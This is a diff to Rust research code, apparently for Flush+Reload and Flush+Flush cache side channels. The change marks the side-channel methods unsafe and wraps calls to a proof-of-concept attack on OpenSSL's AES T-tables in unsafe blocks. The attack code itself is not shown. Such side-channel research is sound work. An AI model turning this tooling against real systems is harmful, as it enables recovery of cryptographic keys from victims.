@@ -1,3 +1,5 @@
+#![feature(unsafe_block_in_unsafe_fn)]
+#![deny(unsafe_op_in_unsafe_fn)]
 use aes_t_tables::SideChannelError::{AddressNotCalibrated, AddressNotReady};
 use aes_t_tables::{
     attack_t_tables_poc, AESTTableParams, CacheStatus, ChannelFatalError,
@@ -97,9 +99,9 @@ fn cum_sum(vector: &Vec<u32>) -> Vec<u32> {
 }
 
 impl MultipleAddrCacheSideChannel for FlushAndFlush {
-    fn test(
+    unsafe fn test(
         &mut self,
-        addresses: impl IntoIterator<Item = *const u8> + Clone, // Fixme : This API should probably be unsafe to call
+        addresses: impl IntoIterator<Item = *const u8> + Clone,
     ) -> Result<Vec<(*const u8, CacheStatus)>, SideChannelError> {
         let mut result = Vec::new();
         let mut tmp = Vec::new();
@@ -124,7 +126,7 @@ impl MultipleAddrCacheSideChannel for FlushAndFlush {
         Ok(result)
     }
 
-    fn prepare(
+    unsafe fn prepare(
         &mut self,
         addresses: impl IntoIterator<Item = *const u8> + Clone,
     ) -> Result<(), SideChannelError> {
@@ -151,7 +153,7 @@ impl MultipleAddrCacheSideChannel for FlushAndFlush {
         operation(); // TODO use a different helper core ?
     }
 
-    fn calibrate(
+    unsafe fn calibrate(
         &mut self,
         addresses: impl IntoIterator<Item = *const u8> + Clone,
     ) -> Result<(), ChannelFatalError> {
@@ -384,23 +386,27 @@ impl MultipleAddrCacheSideChannel for FlushAndFlush {
 fn main() {
     let open_sslpath = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");
     let mut side_channel = NaiveFlushAndReload::from_threshold(220);
-    attack_t_tables_poc(
-        &mut side_channel,
-        AESTTableParams {
-            num_encryptions: 1 << 14,
-            key: [0; 32],
-            te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
-            openssl_path: &open_sslpath,
-        },
-    );
+    unsafe {
+        attack_t_tables_poc(
+            &mut side_channel,
+            AESTTableParams {
+                num_encryptions: 1 << 14,
+                key: [0; 32],
+                te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+                openssl_path: &open_sslpath,
+            },
+        )
+    };
     let mut side_channel_ff = FlushAndFlush::new().unwrap();
-    attack_t_tables_poc(
-        &mut side_channel_ff,
-        AESTTableParams {
-            num_encryptions: 1 << 15,
-            key: [0; 32],
-            te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
-            openssl_path: &open_sslpath,
-        },
-    );
+    unsafe {
+        attack_t_tables_poc(
+            &mut side_channel_ff,
+            AESTTableParams {
+                num_encryptions: 1 << 15,
+                key: [0; 32],
+                te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+                openssl_path: &open_sslpath,
+            },
+        )
+    };
 }
